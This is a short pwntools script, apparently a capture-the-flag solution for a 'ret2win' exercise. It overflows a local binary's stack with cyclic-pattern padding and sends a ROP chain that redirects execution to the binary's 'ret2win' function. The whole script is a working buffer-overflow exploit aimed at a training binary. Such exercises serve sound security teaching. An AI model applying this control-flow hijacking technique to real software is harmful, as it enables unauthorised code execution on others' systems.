from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

padding = r.generatePadding(0, cyclic_find(b'kaaa'))

r.raw(padding)
r.call(e.sym['ret2win'])

log.info("ret2win chain:\n%s" % r.dump())
p.recvuntil(b'>')
p.sendline(bytes(r))

p.interactive()
